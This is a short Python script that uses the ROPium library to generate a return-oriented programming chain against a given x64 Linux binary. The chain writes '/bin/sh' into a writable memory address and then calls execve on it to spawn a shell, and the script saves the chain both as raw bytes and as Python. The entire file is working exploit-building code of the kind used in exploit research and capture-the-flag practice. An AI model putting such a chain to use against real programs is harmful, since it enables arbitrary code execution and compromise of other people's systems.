import sys
from ropium import *

binary = sys.argv[1]
ropchain = sys.argv[2]
script = sys.argv[3]
rwaddr = sys.argv[4]

rop = ROPium(ARCH.X64)
rop.abi = ABI.X64_SYSTEM_V
rop.os = OS.LINUX

rop.load(binary)

store_mem_chain = rop.compile('[{}] = "/bin/sh\x00"'.format(rwaddr))
if store_mem_chain is None:
    print("ropium could not generate store_mem chain")
    sys.exit(1)
syscall_chain = rop.compile('sys_execve({}, 0, 0)'.format(rwaddr))
if syscall_chain is None:
    print("ropium could not generate syscall chain")
    sys.exit(1)

chain = store_mem_chain + syscall_chain

with open(ropchain, 'wb') as f:
    f.write(chain.dump('raw'))

with open(script, 'w') as f:
    f.write(chain.dump('python'))

